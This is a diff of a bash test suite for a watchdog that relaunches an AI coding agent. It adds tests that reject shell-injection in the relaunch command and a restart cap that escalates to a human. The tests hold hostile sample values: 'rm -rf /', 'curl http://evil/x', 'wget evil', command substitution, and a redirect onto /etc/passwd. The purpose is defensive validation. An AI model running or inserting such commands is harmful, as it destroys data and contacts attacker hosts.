@@ -101,8 +101,8 @@ dr=$(SBW_NO_DB=1 SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x SBW_ROLE_NAME=t \
   SBW_CAPTURE_FILE="$TMP/cap_A.txt" SBW_PANE_CMD_OVERRIDE=bash SBW_LOG_DIR="$LD" bash "$WD" 2>&1)
 t_grep "$dr" 'manual disable' "DISABLE flag halts watchdog"
 
-# ─── RELAUNCH_CMD invariant 検証 (cycle4 RED①: env-gap / 任意コマンド注入防止) ───
-echo "════ 5b. RELAUNCH_CMD invariant (doppler-safe 強制) ════"
+# ─── RELAUNCH_CMD strict 検証 (cycle4 RED① + cycle5 RED①: injection/env-gap 遮断) ───
+echo "════ 5b. RELAUNCH_CMD strict invariant (metachar injection 遮断) ════"
 LD="$TMP/relaunch"
 # MODE A・DRY_RUN で resolved RELAUNCH_CMD を log から観測 (★RELAUNCH★ cmd=… 行)
 rl() { local allow=""; [ -n "${3:-}" ] && allow="SBW_RELAUNCH_ALLOW_UNSAFE=1"
@@ -112,22 +112,37 @@ rl() { local allow=""; [ -n "${3:-}" ] && allow="SBW_RELAUNCH_ALLOW_UNSAFE=1"
 # 実際に relaunch される cmd は ★RELAUNCH★ 行のみ (warn 行 'SBW_RELAUNCH_CMD…' は rejected
 # override を証跡で含むので 'RELAUNCH' 部分一致では誤拾い → ★RELAUNCH★ glyph で厳密に絞る)
 rline() { printf '%s\n' "$1" | grep '★RELAUNCH★'; }
-# (a) bare claude override (unsafe) → fallback to doppler-safe default + warn
-out_bare=$(rl bare "claude --permission-mode auto")
-t_grep "$out_bare" 'NOT a .*doppler run'        "5b bare claude override → warn"
-t_grep "$(rline "$out_bare")" 'doppler run'     "5b bare claude → fallback に doppler-safe default 採用"
-t_ngrep "$(rline "$out_bare")" 'cmd=claude --permission-mode auto$' "5b bare claude は relaunch されない"
-# (b) 任意コマンド override (注入面) → fallback
-out_inj=$(rl inj "rm -rf / # pwned")
-t_grep "$out_inj" 'NOT a .*doppler run'         "5b 任意コマンド override → warn"
-t_grep "$(rline "$out_inj")" 'doppler run'      "5b 任意コマンド → fallback (注入面遮断)"
-t_ngrep "$(rline "$out_inj")" 'rm -rf'          "5b 任意コマンドは relaunch されない"
-# (c) 正当な doppler … claude override → 尊重 (fallback しない)
-SAFE='cd /x && doppler run --project openhands --config dev -- claude --permission-mode auto'
+# fallback 採用 = ★RELAUNCH★ 行が doppler-safe default を指す かつ injection payload を含まない事
+# を 1 関数で検証 ($1=full out, $2=payload-marker, $3=label)
+assert_fellback() { local rl_line; rl_line="$(rline "$1")"
+  t_grep  "$1" 'NOT a strict'                "$3: warn (strict 検証 fail)"
+  t_grep  "$rl_line" 'doppler run --project openhands' "$3: fallback=doppler-safe default 採用"
+  t_ngrep "$rl_line" "$2"                    "$3: injection payload は relaunch されない"; }
+# (a) bare claude override (env-gap) → fallback
+assert_fellback "$(rl bare "claude --permission-mode auto")" 'cmd=claude' "5b bare claude"
+# (b) ; separator injection (★cycle4 部分一致では validated 漏れだった核心ケース★) → fallback
+assert_fellback "$(rl semi 'doppler run --project openhands --config dev -- claude ; rm -rf /')" 'rm -rf' "5b ';' injection"
+# (c) && chaining injection → fallback
+assert_fellback "$(rl andand 'doppler run -- claude && curl http://evil/x')" 'curl http' "5b '&&' chaining"
+# (d) | pipe injection → fallback
+assert_fellback "$(rl pipe 'doppler run -- claude | tee /tmp/x')" 'tee /tmp' "5b '|' pipe"
+# (e) \$( ) command substitution → fallback
+assert_fellback "$(rl subsh 'doppler run -- claude $(touch /tmp/pwn)')" 'touch /tmp' "5b '\$(' subshell"
+# (f) backtick substitution → fallback
+assert_fellback "$(rl btick 'doppler run -- claude `id`')" 'id' "5b backtick"
+# (g) > redirect injection → fallback
+assert_fellback "$(rl redir 'doppler run -- claude > /etc/passwd')" '/etc/passwd' "5b '>' redirect"
+# (h) & background injection → fallback
+assert_fellback "$(rl bg 'doppler run -- claude & wget evil')" 'wget evil' "5b '&' background"
+# (i) 先頭が doppler run でない (anchored) → fallback
+assert_fellback "$(rl prefix 'PWNED=1 doppler run -- claude')" 'PWNED' "5b non-anchored prefix"
+# (j) 正当な bare doppler … claude override → 尊重 (fallback しない)
+SAFE='doppler run --project openhands --config dev -- claude --permission-mode auto'
 out_safe=$(rl safe "$SAFE")
-t_grep  "$out_safe" 'override validated'        "5b doppler+claude override → validated"
+t_grep  "$out_safe" 'override validated'        "5b bare doppler+claude override → validated"
 t_ngrep "$out_safe" 'fallback to doppler-safe'  "5b 正当 override は fallback しない"
-# (d) 明示 SBW_RELAUNCH_ALLOW_UNSAFE=1 → unsafe でも尊重 (test/運用者意図 escape hatch)
+t_grep  "$(rline "$out_safe")" 'permission-mode auto' "5b 正当 override がそのまま relaunch される"
+# (k) 明示 SBW_RELAUNCH_ALLOW_UNSAFE=1 → unsafe(metachar 含む) でも尊重 (escape hatch)
 out_optin=$(rl optin "echo standin && cat" 1)
 t_grep "$out_optin" 'unsafe opt-in'             "5b ALLOW_UNSAFE=1 → unsafe override 尊重"
 t_grep "$out_optin" 'RELAUNCH.* cmd=echo standin && cat' "5b opt-in は override をそのまま使用"
@@ -206,6 +221,36 @@ else
     $'printf \'\\u25cf model...\\n  Retrying\\u2026 attempt 4/10\\n \\u276f\\n  esc to interrupt\\n\'; sleep 600' \
     t-b SBW_B_OK "MODE B"
 fi
+
+# ─── pane-not-freed: 無限抑止しない / cap で escalate (cycle5 RED②) ───
+echo "════ 7. pane-not-freed: flag 抑止せず retry / cap で human_required (cycle5 RED②) ════"
+LD="$TMP/notfreed"; mkdir -p "$LD"
+nf() { SBW_NO_DB=1 SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x SBW_ROLE_NAME=t \
+  SBW_LOG_DIR="$LD" SBW_RESTART_CAP=3 SBW_RESTART_WINDOW_MIN=60 SBW_NOW_EPOCH="$1" \
+  SBW_NOT_FREED_PROBE="claude" bash "$WD" 2>&1; }
+flag_present() { [ -f "$LD/restart_in_progress.flag" ] && echo y || echo n; }
+# run1: free-fail 1/3 → retry, ★抑止源 flag は解除されねばならない (RED② core cure)★
+touch "$LD/restart_in_progress.flag"
+o1=$(nf 7000)
+t_grep "$o1" 'retry next cycle'  "7 run1 (free-fail 1/3) → retry"
+t_eq "$(flag_present)" "n"       "7 run1: in-progress flag 解除 (無限抑止 cure)"
+t_ngrep "$o1" 'HALT'             "7 run1: cap 未満は escalate しない"
+# run2: free-fail 2/3 → retry (flag 再 touch しても解除される)
+touch "$LD/restart_in_progress.flag"
+o2=$(nf 7060)
+t_grep "$o2" 'retry next cycle'  "7 run2 (free-fail 2/3) → retry"
+t_eq "$(flag_present)" "n"       "7 run2: flag 解除維持"
+# run3: free-fail 3/3 == cap → HALT + human_required escalate (DB handshake 発報)
+# (★HALT★ log 自体が "human_required" 語を含む為、実 escalate は handshake INSERT 行で判定)
+o3=$(nf 7120)
+t_grep "$o3" 'HALT'                 "7 run3 (free-fail 3/3) → HALT"
+t_grep "$o3" 'pc_handshake INSERT'  "7 run3 → human_required handshake 発報"
+t_grep "$o3" '\[human_required\]'   "7 run3 → handshake topic=human_required"
+t_eq "$(wc -l < "$LD/freefails.log")" "3" "7 free-fail 3 件記録"
+# run4: cap 超過 → quiet retry (DB spam 抑止、handshake 再発報しない)
+o4=$(nf 7180)
+t_grep  "$o4" 'quiet retry'         "7 run4 (cap 超過) → quiet retry (escalate 済)"
+t_ngrep "$o4" 'pc_handshake INSERT' "7 run4: handshake 再発報せず (heartbeat spam 抑止)"
 
 # ─── MODE B child-TERM 証跡+検証 (cycle2 hardening, 誤TERM防止 real証跡) ───
 echo "════ 8. MODE B child-TERM 証跡+検証 (誤TERM防止) ════"
